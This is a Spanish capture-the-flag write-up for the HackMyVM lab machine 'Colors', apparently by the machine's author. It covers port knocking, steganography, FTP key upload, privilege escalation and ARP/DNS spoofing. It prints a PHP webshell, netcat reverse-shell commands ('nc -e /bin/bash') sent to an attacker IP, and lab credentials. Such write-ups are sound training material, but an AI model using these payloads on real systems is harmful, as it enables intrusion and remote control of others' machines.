---
layout: post
title: Colors - Hackmyvm
tags: [ctf, hackmyvm, by-me]
---

**Autor**: 0xH3rshel \\
**Dificultad**: Medio

![img](/imgs/write-ups/by-me/colors/colors.png#center)

## Pre-Pentesting

Al descomprimir el archivo zip con la máquina, viene también incluido un archivo de texto que dice lo siguiente.

```
Hey hacker, I've heard a lot about you and I've been told you're good. 

The FBI has hacked into my apache server and shut down my website. I need you to sneak in and retrieve the "root.txt" file. I left my credentials somewhere but I can't remember where.

I will pay you well if you succeed, good luck hacker.
```

Este archivo nos dá un par de pistas para más adelante.

## Reconocimiento

Como siempre, lo primero es realizar un escaneo de los puertos disponibles en la máquina.

```
$ sudo nmap 192.168.1.89
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-11 14:23 EST
Nmap scan report for 192.168.1.89
Host is up (0.000098s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE    SERVICE
21/tcp open     ftp
22/tcp filtered ssh
80/tcp open     http
```

Ssh filtered??

### FTP (21) Parte 1

Continuo con el puerto 21 y accedo utilizando el usuario **anonymous**. En la carpeta se pueden ver 4 archivos (First, Second, Third y secret.jpg).

```
$ ftp 192.168.1.89
Connected to 192.168.1.89.
220 (vsFTPd 3.0.3)
Name (192.168.1.89:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||30473|)
150 Here comes the directory listing.
-rw-r--r--    1 1127     1127            0 Jan 27 22:45 first
-rw-r--r--    1 1039     1039            0 Jan 27 22:45 second
-rw-r--r--    1 0        0          290187 Feb 11 16:35 secret.jpg
-rw-r--r--    1 1081     1081            0 Jan 27 22:45 third
```

### Knocking? IPv6?

El acceso a SSH mediante IPv4 está filtrado por el uso de **knockd**. Para permitir las conexiones hay que llamar a los puertos dados por los **id** en el orden que indican los nombres de los archivos.

Para esto se puede utilizar el comando **knock** seguido de los puertos.

```
$ knock 192.168.1.89 1127 1039 1081
$ sudo nmap 192.168.1.89
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-11 14:29 EST
Nmap scan report for 192.168.1.89
Host is up (0.000088s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Ya está abierto el puerto.

Otra opción es utilizar IPv6 para acceder.

Esta parte queda a gusto de consumidor.

### Stego

En el texto del principio nos dice el autor que dejó sus credenciales en algún sitio. Ese sitio es dentro de la imágen **secret.jpg**.

Para descubrir el texto oculto, utilizo **stegseek**.

```
$ stegseek secret.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "Nevermind"
[i] Original filename: "more_secret.txt".
[i] Extracting to "secret.jpg.out".
```

Rápidamente encuentra la palabra clave y puedo leer un texto codificado.

```
$ cat secret.jpg.out
<-MnkFEo!SARTV#+D,Y4D'3_7G9D0LFWbmBCht5'AKYi.Eb-A(Bld^%E,TH.FCeu*@X0)<BOr<.BPD?sF!,R<@<<W;Dfm15Bk2*/F<G+4+EV:*DBND6+EV:.+E)./F!,aHFWb4/A0>E$/g+)2+EV:;Dg*=BAnE0-BOr;qDg-#3DImlA+B)]_C`m/1@<iu-Ec5e;FD,5.F(&Zl+D>2(@W-9>+@BRZ@q[!,BOr<.Ea`Ki+EqO;A9/l-DBO4CF`JUG@;0P!/g*T-E,9H5AM,)nEb/Zr/g*PrF(9-3ATBC1E+s3*3`'O.CG^*/BkJ\:
```

Para decodificarlo, utilizo **From base85** en **[Cyberchef](https://cyberchef.org/)**.

```
Twenty years from now you will be more disappointed by the things that you didn't do than by the ones you did do. So throw off the bowlines. Sail away from the safe harbor. Catch the trade winds in your sails. Explore. Dream. Discover.
pink:Pink4sPig$$
```

Al final del texto se puede ver tanto el usuario como la contraseña.

### FTP (21) Parte 2

Al intentar acceder mediante ssh con el usuario y contraseña me encuentro con que solo se puede acceder utilizando una clave privada.

Para solucionar esto, accedo mediante **ftp** a la carpeta .ssh y subo unas claves pública y privada.

```
ftp> put id_rsa
[...]
ftp> put authorized_keys
[...]
ftp> ls
229 Entering Extended Passive Mode (|||62897|)
150 Here comes the directory listing.
-rw-------    1 1000     1000          563 Feb 11 20:31 authorized_keys
-rw-------    1 1000     1000         2590 Feb 11 20:31 id_rsa
226 Directory send OK.
```

Ahora sí puedo acceder mediante ssh.

## Esladado de privilegios

El usuario pink no puede hacer nada por lo que hay que moverse lateralmente a www-data, que es como el fbi consiguio llegar a root en el servidor (Lo dice el autor antes en el archivo del principio) ;)

### www-data

Para tener una shell como www-data, creo una webshell en la carpeta "/var/www/html" y utilizo **curl** para la petición.

```
pink@color:/var/www/html$ cat sh.php
<?php system($_GET['cmd']);?>
```

```
$ curl 192.168.1.89/sh.php?cmd=nc+-e+/bin/bash+192.168.1.86+1234
```

```
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.1.86] from (UNKNOWN) [192.168.1.89] 49774
whoami
www-data
```

### Green

El escalado a green es sencillo ya que siendo www-data puedo ejecutar **vim** como el usuario Green. [GTFOBINS](https://gtfobins.github.io/gtfobins/vim/#sudo)

```
www-data@color:/var/www/html$ sudo -l
Matching Defaults entries for www-data on color:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on color:
    (green) NOPASSWD: /usr/bin/vim
```

### Purple

En el home de green existe un binario, **test_4_green**, en el que si adivinamos un número aleatorio se nos mostrará la contraseña de Purple.

Acertar el número es muy muy muy poco probable por lo que para conseguir la contraseña de manera rápida se puede hacer un pequeño parche en el binario, en la parte que comprueba el número que introducimos con el número que tendriamos que adivinar.

Lo que hay que hacer es modificar la comprobacion que hay justo encima de donde se puede leer "Correct". Hay que cambiar la intrucción "jne" por "je". Para esto yo he utilizado **[Radare2](https://github.com/radareorg/radare2)**.

```
│       ┌─< 0x00001257   *  7572           jne 0x12cb
│       │   0x00001259      488d3dca0d00.  lea rdi, str.Correct___Here_is_the_pass:    ; 0x202a ; "Correct!! Here is
│       │   0x00001260      e8dbfdffff     call sym.imp.puts           ;[6] ; int puts(const char *s)
│       │   0x00001265      488d8530feff.  lea rax, [var_1d0h]
│       │   0x0000126c      488d15e50d00.  lea rdx, str.FuprpRblcTzeg5JDNNasqeWKpFHvms4rMgrpAFYj5Zngqgvl7jK0iPpViDRe
│       │   0x00001273      b937000000     mov ecx, 0x37               ; '7'
│       │   0x00001278      4889c7         mov rdi, rax
│       │   0x0000127b      4889d6         mov rsi, rdx
│       │   0x0000127e      f348a5         rep movsq qword [rdi], qword ptr [rsi]
│       │   0x00001281      4889f2         mov rdx, rsi
│       │   0x00001284      4889f8         mov rax, rdi
:> wa je 0x12cb
```

Queda de la siguiente manera

```
0x00001254      3945f8         cmp dword [var_8h], eax
│       ┌─< 0x00001257      7472           je 0x12cb
│       │   0x00001259      488d3dca0d00.  lea rdi, str.Correct___Here_is_the_pass: ; 0x202a ; "Correct!! Here is the pass:" ; const char *s
```

Ahora al ejecutarlo, cualquier entrada que pongamos nos dará correcto.

```
$ ./test_4_green
Guess the number im thinking: pepe
Correct!! Here is the pass:
pur******
```

### Root

Purple tiene permiso para ejeuctar "/attack_dir/ddos.sh" como usuario root.

```
purple@color:/home/green$ sudo -l
sudo -l
Matching Defaults entries for purple on color:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User purple may run the following commands on color:
    (root) NOPASSWD: /attack_dir/ddos.sh
```

Al leerlo se puede ver que el script realiza una petición al dominio **masterddos.hmv** y ejecuta el script **attack.sh**.

```
purple@color:~$ cat /attack_dir/ddos.sh
#!/bin/bash
/usr/bin/curl http://masterddos.hmv/attack.sh | /usr/bin/sh -p
```

Utilizando Ettercap, se hace un ataque de **DNS Spoofing** para poder pasarle al servidor cualquier script. En este caso es suficiente con una reverse shell simple.

Pasos

- Crear el archivo attack.sh en la máquina local.
- Ejecutar un servidor http con python en el mismo directorio que attack.sh.
- Ejecutar Ettercap y realizar ARP Poisoning y DNS Spoofing.

Una vez esté todo, ejecutar ddos.sh en el servidor y obtener una shell como root.

![img](/imgs/write-ups/by-me/colors/etter.png#center)

Attack.sh

```
$ cat attack.sh
nc -e /bin/bash 192.168.1.86 1234
```

Inicio servidor

```
$ python3 -m http.server 80
```

Ejecuto el script.

```
purple@color:~$ sudo /home/purple/ddos.sh
sudo /home/purple/ddos.sh
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    34  100    34    0     0   1789      0 --:--:-- --:--:-- --:--:--  1789
```

```
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [192.168.1.86] from (UNKNOWN) [192.168.1.89] 58892
whoami
root
:)
```

Y con esto la máquina ya estaría resuelta.

## Fin

Esta es la primera máquina que hago, espero que os haya gustado. :)
